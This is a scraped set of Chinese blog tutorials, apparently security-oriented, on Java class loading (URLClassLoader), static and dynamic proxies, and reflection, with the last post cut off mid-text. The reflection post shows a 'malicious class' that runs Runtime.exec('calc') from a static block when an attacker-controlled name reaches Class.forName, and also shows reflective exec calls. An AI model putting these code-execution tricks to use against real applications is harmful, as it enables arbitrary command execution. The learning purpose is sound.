main(String[] args) throws Exception{ File filePath = new File(\u0026#34;E:\\\\\u0026#34;); URL url = filePath.toURI().toURL(); System.out.println(filePath.toURI()); System.out.println(filePath.toURI().toURL()); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTest类加载器为\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTest类的父加载器为\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } 输出结果：\n1 2 3 4 5 file:/E:/ file:/E:/ MyTest类加载器为java.net.URLClassLoader@7a81197d MyTest类的父加载器为sun.misc.Launcher$AppClassLoader@14dad5dc 调用了无参构造函数 可以看到这里调用的是URLClassLoader构造器，并且这个构造器的父加载器是AppClassLoader加载器。了大概说一下这里的逻辑，先用File类来定义了一个在D盘下搜索文件的File对象。\n然后调用了toURI().toURL()函数来将File对象转换为URL，因为URL是URLClassLoader用来定位资源的格式。这里创建了一个URL类型的数组，是URLClassLoader类的构造函数决定的：\n然后就是加载类那些了，不多说。\n但是如果classpath中有相关远程加载类的编译代码，此时AppClassLoader就会优先加载这个本地class文件，而不会去加载E盘的文件，如下尝试;\n另外的MyTest.java文件内容：\n1 2 3 4 5 public class MyTest { public MyTest(){ System.out.println(\u0026#34;调用了classPath中的MyTest文件\u0026#34;); } } 然后我将其打成jar包加入到当前maven项目的外部库中，也就是引入了classpath中，再使用之前的代码里来测试，输出如下：\n1 2 3 4 5 file:/E:/ file:/E:/ MyTest类加载器为sun.misc.Launcher$AppClassLoader@14dad5dc MyTest类的父加载器为sun.misc.Launcher$ExtClassLoader@2f92e0f4 调用了classPath中的MyTest文件 可以看到确实是优先调用的classpath中的文件，并且不再调用URL中引入的文件。\n但是这里同样是有解决方法的，我们可以将URLClassLoader的父类设置为启动类加载器，这样在双亲委派时就可以避免AppClassLoader加载classpath中的文件，而是URLClassLoader优先加载。\n测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ File filePath = new File(\u0026#34;E:\\\\\u0026#34;); URL url = filePath.toURI().toURL(); System.out.println(filePath.toURI()); System.out.println(filePath.toURI().toURL()); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTest类加载器为\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTest类的父加载器为\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } 执行结果为：\n1 2 3 4 5 file:/E:/ file:/E:/ MyTest类加载器为java.net.URLClassLoader@24d46ca6 MyTest类的父加载器为null 调用了无参构造函数 可以看到这里成功外部加载了其他的class文件。这里调用的构造函数为：\n可以看出来第二个参数就是指定父类的操作，在前面的学习后，这里将其设置为null就是将其设置为启动类加载器的子加载器，很好理解，然后个人理解这里调用URLClassLoader就是用来“动态构造”一个ClassLoader，大概就是这样。\n同样的，还可以直接将其设置为一个URL对象，如下代码：\nMain.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;file:/E:/\u0026#34;); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTest类加载器为\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTest类的父加载器为\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } 输出结果为：\n1 2 3 MyTest类加载器为java.net.URLClassLoader@24d46ca6 MyTest类的父加载器为null 调用了无参构造函数 本地加载成功，网络传输class文件是差不多的，在这里对于传参类型看源码很容易看出来，这里不多说。\n但是有一个点是要说明的，如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;file:/D:/\u0026#34;); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTest类加载器为\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTest类的父加载器为\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } 没有输出，而是报错：\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: MyTest at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java_foundation.Main.main(Main.java:11) 想了一下，这是因为”新定义“的URLClassLoader只是启动类的子加载器，但是它没有子加载器，这里D盘下并没有MyTest.class文件，虽然classpath中有，但是没有子类，所以是无法调用成功的，可以和前面父类的AppclassLoader的代码对比理解一下。\n——————————\n参考文章：\nhttps://xz.aliyun.com/t/12669?time__1311=GqGxuDRiD%3Dit%3DGN4eeqBKqAKKhQQdFD9WoD\nhttps://blog.csdn.net/yrk0556/article/details/105348968\nhttps://blog.csdn.net/qq_37205350/article/details/108805628\nhttps://blog.csdn.net/briblue/article/details/54973413\nhttps://blog.csdn.net/TJtulong/article/details/89598598\nhttps://blog.csdn.net/m0_45406092/article/details/108984101\nhttps://nivi4.notion.site/Java-cedccc0611654bd99f841de3ef578e24\n","date":"2024-06-19T22:54:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/","title":"Java类加载机制"},{"content":"Java动态代理 利用了代理模式，一个通俗易懂的说法：给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。\n简单说明 代理模式是Java中常见的设计模式。\n其特征是代理类和委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把信息转发给委托类，以及事后处理消息等。\n代理类与委托类之间通常会存在关联关系，一个代理类对象与一个委托类对象关联，代理类对象本身并不真正实现服务，而是通过委托类对象的相关方法来提供特定服务。\n静态代理 需要代理对象和目标对象实现同样的接口。\n**缺点：**当需要的代理的对象过多就需要实现大量的代理类，并且当接口增加方法，目标对象与代理对象都要进行修改\n直接用参考文章的一个demo来演示一下什么是静态代理，理解一下\nEvent.java:\n1 2 3 4 5 6 //接口类 package java_foundation; public interface Event { void sale(); } Text.java\n1 2 3 4 5 6 7 8 //委托类 package java_foundation; public class Text implements Event { public void sale(){ System.out.println(\u0026#34;要卖房子了\u0026#34;); } } MyTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //代理类 package java_foundation; public class MyTest implements Event{ private Event instances; public MyTest(Event a){ this.instances = a; } public void sale(){ instances.sale(); System.out.println(\u0026#34;售价2000元\u0026#34;); } } 最终的测试类：Test.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 //测试类 package java_foundation; public class Main{ public static void main(String[] args) throws Exception{ System.out.println(\u0026#34;======使用代理前====\u0026#34;); Text a = new Text(); a.sale(); System.out.println(\u0026#34;======使用代理后====\u0026#34;); MyTest b = new MyTest(new Text()); b.sale(); } } 只要搞清楚对象的关系，这里的代码就不难理解了。最后结果如下：\n1 2 3 4 5 ======使用代理前==== 要卖房子了 ======使用代理后==== 要卖房子了 售价2000元 也就是可以将代理设想为这里卖房子的中介，中介来给你定义具体的内容，你只需要把大体的说明就行了。\n我们这里是用的接口类作为接收参数的类型，并且构造函数的接收的参数类型也都是接口类型。\n有一个点说明一下，这里为什么这里要使用Event接口类型作为媒介呢，应该是因为委托类实现了Event接口，这样就可以使得相应的Text()对象可以成为这个类型，同时代理类MyTest也接口了Event接口，所以MyTest类也可以接受Event类型的数据。\n这里最重要的实现代理的操作就是代理类中的如下代码：\n1 2 3 4 public void sale(){ instances.sale(); System.out.println(\u0026#34;售价2000元\u0026#34;); } 就是因为这串代码导致的最终输出为\n1 2 要卖房子了 售价2000元 因为我们new后将instance对应到了委托类的对象，此时就会调用Text.java中的sale()方法，所以其实一般代理类的重要代码都会调用两次。简单流程图如下\n动态代理 与静态代理相同，需要公共接口，委托类，代理类。区别就是动态代理是利用反射机制在运行时创建代理类。这里需要用到位于Java.lang.reflect下的Proxy类与InvocationHandler接口。\nInvocationHandler接口：负责提供调用代理的操作 1 2 3 4 public interface InvocationHandler { public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; } 其中proxy为代理类的实例对象，method表示调用的方法名，args[]为调用方法的参数数组\n这个接口定义了一个invoke()方法，每个代理对象都有一个关联的接口。这个是很重要的：当代理对象上调用任意方法时，该方法会被自动转发到InvocationHandler.invoke()方法进行调用\nProxy类：负责动态构建代理类 位于java.lang.reflect.Proxy，提供了静态方法用于得到代理对象\n1 public static Object newProxyInstance(ClassLoader loader,Class\u0026lt;?\u0026gt;[] interfaces,InvocationHandler h)throws IllegalArgumentException{} 继续使用前面的那个例子，结合代码，我们这里需要获得类加载器，相对应的方法，直接给代码：\n委托类和接口不变，\nText.java:\n1 2 3 4 5 6 7 8 //委托类 package java_foundation; public class Text implements Event { public void sale(){ System.out.println(\u0026#34;要卖房子了\u0026#34;); } } Event.java：\n1 2 3 4 5 6 //接口类 package java_foundation; public interface Event { void sale(); } 看其他需要修改的代码：\nMyTest.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //动态获取代理的代理类 package java_foundation; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class MyTest implements InvocationHandler{ private Object instances; public MyTest(Object a){ this.instances = a; } //重写invoke()方法 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable{ System.out.println(\u0026#34;售价2000元\u0026#34;); Object result = method.invoke(instances,args); return result; } } 在这个代理类重写的invoke()方法中，看到了很熟悉的操作，调用方法，对，就是调用了invoke()方法，结合在前面说明InvocationHandler接口类时，大概久能知道这里的调用逻辑。后面看了结果就知道了。\nMain.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //测试类 package java_foundation; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception{ //获取委托类的实例对象 Text text = new Text(); //获取CalssLoader ClassLoader classLoader = text.getClass().getClassLoader(); //获取所有接口 Class[] interfaces = text.getClass().getInterfaces(); //获取一个调用处理器 InvocationHandler invocatinoHandler = new MyTest(text); //创建代理对象 Event proxy = (Event)Proxy.newProxyInstance(classLoader,interfaces,invocatinoHandler); proxy.sale(); } } 成功输出\n1 2 售价2000元 要卖房子了 大概就是这这样，其实理解一下就行了，难度不是很高，重点关注invoke()中的代码。\n（参考文章有一道题，后面可以学习一下）\n参考文章：\nhttps://xz.aliyun.com/t/9197?time__1311=n4%2BxuDgD9DyDnB7QGQD%2FD0WoQ4D55i%3D31YNGt4D\nhttps://blog.csdn.net/DDDYSz/article/details/109451049\nhttps://tttang.com/archive/1769/\nhttps://www.cnblogs.com/whirly/p/10154887.html\n","date":"2024-06-19T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","title":"Java动态代理"},{"content":"Java反射机制 Java反射（Reflection）是Java非常重要的动态特性**，通过使用反射我们可以获取到任何类的成员方法（Methods）、成员变量（Fields）、构造方法（Constructors）等信息，还可以动态创建Java实例、调用任意的类方法、修改任意的类成员变量值等**。\n这是一个重要的机制，可以绕过java私有访问权限检查，反射获取并调用私有的类从而可以进行命令执行\n本地JDK测试版本：\nJDK 8u71 最好是搭建一个maven项目来学习，这样更好添加依赖。\n反射机制流程 当我们创建了一个类文件，经过javac编译之后，就会形成.class文件，同时JVM内存会查找生成的.class文件读入内存和经过ClassLoader加载，同时会自动创建生成一个Class对象，里面拥有其获取的成员变量，成员方法，和构造方法等。\nJVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息。获取了某个Class实例，就可以通过这个Class实例获取到该实例对应的class的所有信息\n反射常用的包和类 反射机制相关操作一般位于 java.lang.reflect 包中\n需要注意的类：\n1 2 3 4 java.lang.Class：类对象 java.lang.reflect.Constructor：类的构造器对象 java.lang.reflect.Field：类的属性对象 java.lang.reflect.Method：类的方法对象 反射常见使用的方法 获取类的方法：forName\n实例化类对象的方法：newInstance\n获取函数的方法：getMethod\n执行函数的方法：invoke\n我们可以使用这些方法来获得其他类的各种属性和方法\n获取class对象 forName不是获取“类”的唯一途径，通常来说还有下面三种利用java.lang.Class对象的方式来获取一个“类”\n获取Class对象的三种方式：\nClass.forName(\u0026ldquo;全类名\u0026rdquo;) ：将字节码文件加载进内存，返回Class对象 多用于配置文件，将类名定义在配置文件中。读取文件，加载类。\n类名.class ：通过类名的属性class获取 多用于参数的传递\n对象.getClass() ：getClass()方法定义于Object类中,并且需要先实例化一个对象。这里有一个点要说明。如果不是一个实例化对象，而是一个class对象，那么都会返回class java.lang.Class，同样的，如果是一个方法的class对象，那么返回的会是class java.lang.reflect.Method，注意区分辨别。 classloader.loadClass()：这是通过类加载器来加载类，这个板块不说，后面到类加载器再了解。 多用于对象的获取字节码的方式\n\u0026mdash;-————\n给一个代码来演示一下获取Class对象的三种方式：\n目录结构为：\ndemo：Reflection.java 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; public class Reflection { private String name; protected String sex; public int age = 222; public int getAge(){ return this.age; } public void setName(String name){ this.name=name; } public String getName(){ return this.name; } } 执行代码效果：Main.java： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ //方法一： Class clazz = Class.forName(\u0026#34;java_foundation.Reflection\u0026#34;); Reflection reflection = (Reflection)clazz.newInstance();//实例化对象 reflection.setName(\u0026#34;fupanc\u0026#34;); System.out.println(reflection.getName()); //方法二 Class clazz1 = Reflection.class; Reflection reflection1 = (Reflection)clazz1.newInstance(); reflection1.setName(\u0026#34;fupanc1\u0026#34;); System.out.println(reflection1.getName()); //方法三 Reflection reflection2 = new Reflection(); Class clazz2 = reflection2.getClass(); Reflection reflection3 = (Reflection)clazz2.newInstance(); System.out.println(reflection3.getAge()); //其他说明 Class reflection5 = Reflection.class; System.out.println(reflection5.getClass()); System.out.println(reflection5.getName()); } } 输出为：\n1 2 3 4 5 fupanc fupanc1 222 class java.lang.Class java_foundation.Reflection 可以清楚明白地看出这里的差别，重要的是，学习java一定要有对象的概念。\n需要注意的是，在获取class对象中，一般使用Class.forName方法去获取，其他两个都有一定的限制。\n另外的一个点需要说明\nforName有两个函数重载：\nClass\u0026lt;?\u0026gt; forName(String name)\nClass\u0026lt;?\u0026gt; forName(String name, **boolean** initialize, ClassLoader loader)\n第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：\n1 2 3 Class.forName(className) // 等于 Class.forName(className, true, currentLoader) 默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就是 ClassLoader 。\n对于第二个参数，可以将其理解为对一个类的初始化，构造函数并不会执行，看如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ Class clazz = Class.forName(\u0026#34;java_foundation.Test\u0026#34;); } } class Test{ { System.out.println(\u0026#34;直接调用的{}\u0026#34;); } static{ System.out.println(\u0026#34;直接调用的static\u0026#34;); } public Test(){ System.out.println(\u0026#34;调用了类的构造函数\u0026#34;); } } 输出结果为：\n1 直接调用的static 这样就可以很容易地看出“类的初始化\u0026quot;调用的是static {}，然后当我尝试Test test = new Test();这样显式地初始化时，可以发现调用顺序是：static{} ==》{} ==》构造函数。\n可以延伸一下，假设我们有如下函数，其中函数的参数name可控：\n1 2 3 4 5 6 7 8 9 10 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.MyTest\u0026#34;; Class clazz = Class.forName(name); } } 我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.lang.Runtime; import java.lang.Process; public class MyTest { static{ try{ Runtime runtime = Runtime.getRuntime(); String[] commands = {\u0026#34;calc\u0026#34;}; Process pc = runtime.exec(commands); pc.waitFor(); }catch(Exception e){ } } } 这样是可以成功弹计算机的，当然调用不一定是在main主方法中，还可以是其他方法内部调用。\n获取成员变量Field 获取成员变量Field，位于java.lang.reflect.Field中，常使用的方法有如下几种\nField[] getFields()：获取所有public修饰的成员变量（包括父类） Field[] getDeclaredFields()：获取所有的成员变量，不考虑修饰符（不包括父类） Field getField(String name)：获取指定名称的public修饰的成员变量（包括父类） Field getDeclaredField(String name)：获取指定的成员变量（不包括父类） 获取字段 还是利用之前那个demo来演示一下\nReflection.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; public class Reflection { private String name; protected String sex; public int age = 222; public int getAge(){ return this.age; } public void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Field[] field = clazz.getDeclaredFields(); for(Field x : field){ System.out.println(x); } System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1); System.out.println(field1.getName()); System.out.println(field1.getType()); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2); System.out.println(field2.getName()); System.out.println(field2.getType()); } } //对于数组类型的需要使用for循环来便利输出 输出为：\n1 2 3 4 5 6 7 8 9 10 11 private java.lang.String java_foundation.Reflection.name protected java.lang.String java_foundation.Reflection.sex public int java_foundation.Reflection.age ============== protected java.lang.String java_foundation.Reflection.sex sex class java.lang.String ============== public int java_foundation.Reflection.age age int 我们还需要了解的是一个Field对象包含了一个字段的所有信息，可以使用如下函数获取\ngetName()：返回字段名称 getType()：返回字段类型，也是一个Class实例 getModifiers()：返回字段修饰符 get(obj)：获取字段值 set：修改字段值 这时再看上面给的代码，就可以知道不使用getName()直接输出就可以获取到变量的修饰符以及类型。\n获取字段值 这里就需要用到get(obj)，直接看代码。\n这里将Reflection.java稍微改改\n1 2 3 4 5 6 7 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); System.out.println(field3.get(clazz.newInstance())); } } 输出为：\n1 2 3 4 5 6 7 8 9 10 11 ============== boy ============== 222 ============== Exception in thread \u0026#34;main\u0026#34; java.lang.IllegalAccessException: Class java_foundation.Main can not access a member of class java_foundation.Reflection with modifiers \u0026#34;private\u0026#34; at sun.reflect.Reflection.ensureMemberAccess(Reflection.java:102) at java.lang.reflect.AccessibleObject.slowCheckMemberAccess(AccessibleObject.java:296) at java.lang.reflect.AccessibleObject.checkAccess(AccessibleObject.java:288) at java.lang.reflect.Field.get(Field.java:390) at java_foundation.Main.main(Main.java:19) 这里可以看到private字段抛出错误，可以调用Field.setAccessible(true)，更改代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(clazz.newInstance())); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field3.setAccessible(true); System.out.println(field3.get(clazz.newInstance())); } } /* ============== boy ============== 222 ============== fupanc */ 修改字段值 基本格式：\n1 2 Field f = stdClass.getDeclaredField(\u0026#34;grade\u0026#34;); f.set(obj, \u0026#34;xxxx\u0026#34;); 这样基本就懂了，这里的obj就是一个实例，需要注意：对于private修饰的字段修改方法，同样需要调用Field.setAccessible(true)来使其可访问。测试代码如下： Main.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package java_foundation; import java.lang.Class; import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Object o = clazz.newInstance();//实例化对象 System.out.println(\u0026#34;==============\u0026#34;); Field field1 = clazz.getDeclaredField(\u0026#34;sex\u0026#34;); System.out.println(field1.get(o)); System.out.println(\u0026#34;修改后的内容：\u0026#34;); field1.set(o,\u0026#34;girl\u0026#34;); System.out.println(field1.get(o)); System.out.println(\u0026#34;==============\u0026#34;); Field field2 = clazz.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(field2.get(o)); System.out.println(\u0026#34;修改后的内容：\u0026#34;); field2.set(o,1111); System.out.println(field2.get(o)); System.out.println(\u0026#34;==============\u0026#34;); Field field3 = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field3.setAccessible(true);//注意反射还是需要调用这个 System.out.println(field3.get(o)); System.out.println(\u0026#34;修改后的内容：\u0026#34;); field3.set(o,\u0026#34;hahaha\u0026#34;); System.out.println(field3.get(o)); } } 输出为：\n1 2 3 4 5 6 7 8 9 10 11 12 ============== boy 修改后的内容： girl ============== 222 修改后的内容： 1111 ============== fupanc 修改后的内容： hahaha 注意看代码，这里为什么要实例化一个对象赋值给一个变量，而不是像上面获取字段值那样直接用ctf.newInstance()直接来代表obj，可以先自己想想😈，现在给出解释：\n重点其实还是理解代码，这里调用了两次o，也就是调用了两次对象。如果我们两个地方都使用ctf.newInstance()，那么就会实例化两次，也就是会让前面输出和后面修改的对象是不一致的。所以需要使用一个o来代表这是同一个对象，从而输出修改后的结果。不要小看这一个小小的问题哦\n修改final关键字修饰的成员变量 这里单独拿出来说是因为final关键字修饰的特性，被final关键字修饰的变量表明其数值在初始化之后就不能再更改，并且需要在定义这个字段时就声明值，并且是不能通过设置setter方法来修改，如下代码说明：\n1 2 3 4 5 6 class Something{ private final String name = \u0026#34;fupanc\u0026#34;; public void setName(String name){ this.name = name; } } 此时就会报错： 无法将值赋给 final 变量 \u0026rsquo;name\u0026rsquo;。\n然后按照我的理解，其实前面的set()和get()方法其本质就是setter和getter方法。所以这里该怎么修改呢？\n按照下面套就行，注意需要导入java.lang.reflect.Modifier：\n1 2 3 4 5 6 7 8 9 10 11 // 反射获取Field类的modifiers Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); // 设置modifiers修改权限 modifiers.setAccessible(true); // 修改成员变量的Field对象的modifiers值（像是移除final修饰符） modifiers.setInt(field, field.getModifiers() \u0026amp; ~Modifier.FINAL); // 修改成员变量值 field.set(类实例对象, 修改后的值); 实例使用如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package java_foundation; import java.lang.reflect.Modifier; import java.lang.reflect.Field; public class Text { public static void main(String[] args) throws Exception { Something o = new Something(); Class clazz = Class.forName(\u0026#34;java_foundation.Something\u0026#34;); Field field = clazz.getDeclaredField(\u0026#34;name\u0026#34;); field.setAccessible(true); System.out.println(field.get(o)); Field modifiers = field.getClass().getDeclaredField(\u0026#34;modifiers\u0026#34;); modifiers.setAccessible(true); modifiers.setInt(field,field.getModifiers() \u0026amp; ~Modifier.FINAL); field.set(o,\u0026#34;hahaha\u0026#34;); System.out.println(field.get(o)); } } class Something{ private final String name = \u0026#34;fupanc\u0026#34;; public String getName(){ return this.name; } } /* fupanc hahaha */ 这样就可以修改User类中的private和final属性的name值\n获取类的方法 想要创建Method需要导包，位于java.lang.reflect.Method下，常使用的方法如下：\n1 2 3 4 5 Method getMethod(name,Class...)：获取某个public的Method（包括父类） Method getDeclaredMethod(name,Class...)：获取当前类的某个Method（不包括父类） //第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型 Method[] getMethods()：获取所有public的Method（包括父类） Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类） 同样的一个Method对象包含一个方法的所有信息：\ngetName()：返回方法名称 getReturnType()：返回方法返回值类型，也是一个Class实例 getParameterTypes()：返回方法的参数类型，是一个Class数组 getModifiers()：返回方法的修饰符 获取方法 直接给代码看如何利用,为了凸显结果方便理解，这里改一下Reflection.java的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; public int getAge(){ return this.age; } private void setAge(int age){ this.age = age; } protected void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; import java.lang.Class; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Method[] method = clazz.getDeclaredMethods(); for(Method x:method){ System.out.println(x); } System.out.println(\u0026#34;==============\u0026#34;); Method method1 = clazz.getDeclaredMethod(\u0026#34;setAge\u0026#34;,int.class); System.out.println(method1.getName()); System.out.println(method1.getReturnType()); } } 输出为：\n1 2 3 4 5 6 7 public java.lang.String java_foundation.Reflection.getName() protected void java_foundation.Reflection.setName(java.lang.String) private void java_foundation.Reflection.setAge(int) public int java_foundation.Reflection.getAge() ============== setAge void 这里需要注意的就是对于不同修饰符修饰的方法在获取时使用的方法的不同，但其实一般都是使用的Declared那类方法。\n调用方法 invoke()：调用方法。\ninvoke的作用是执行方法，需要两个参数，第一个参数是：\n如果这个方法是一个普通方法，那么第一个参数是类对象 如果这个方法是一个静态方法，那么第一个参数是类 第二个参数是这个方法的需要传入的参数。\n这里需要注意一点，在调用方法这里与获取成员变量差不多，private修饰符，需要通过Method.setAccessible(true)允许其调用。\n先简单给代码看看\nReflection.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 package java_foundation; public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; protected String sex = \u0026#34;boy\u0026#34;; public int age = 222; public int getAge(){ return this.age; } private void setAge(int age){ this.age = age; } protected void setName(String name){ this.name=name; } public String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package java_foundation; import java.lang.Class; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.Reflection\u0026#34;; Class clazz = Class.forName(name); Object o = clazz.newInstance(); Method method1 = clazz.getDeclaredMethod(\u0026#34;setAge\u0026#34;,int.class); method1.setAccessible(true); //需要允许访问 method1.invoke(o,123); Method method2 = clazz.getDeclaredMethod(\u0026#34;getAge\u0026#34;); System.out.println(method2.invoke(o)); Method method3 = clazz.getDeclaredMethod(\u0026#34;setName\u0026#34;,String.class); method3.invoke(o,\u0026#34;hahaha\u0026#34;); Method method4 = clazz.getDeclaredMethod(\u0026#34;getName\u0026#34;); System.out.println(method4.invoke(o)); } } /* 123 hahaha */ 可以看出成功调用了setName/setAge方法并设置了name/age的值，可以自己再调试一下，这里只有private修饰的方法才需要调用setAccessible(true)，注意看代码之间的联系。\n稍微说明一下静态方法的利用方式，如下格式：\n1 2 3 4 5 6 7 8 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(Runtime.class); r.exec(\u0026#34;calc\u0026#34;); 同样的可以使用 Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;calc\u0026#34;); //getRuntime()方法是静态方法，这样就可以直接执行方法从而获取Runtime类的实例化对象 这是反射API知道静态方法不需要实例对象，因此invoke方法的第一个参数（对象实例）可以是null或类对象，反射API会自动处理并忽略它。注意理解上面的格式。\n获取构造函数Constructor 获取构造函数Constructor，位于java.lang.reflect.Constructors中，常使用的方法有：\nConstructor[] getConstructors()：只返回public构造函数 Constructor[] getDeclaredConstructors()：返回所有构造函数 Constructor getConstructor(Class\u0026hellip;)：匹配和参数配型相符合的public构造函数 Constructor 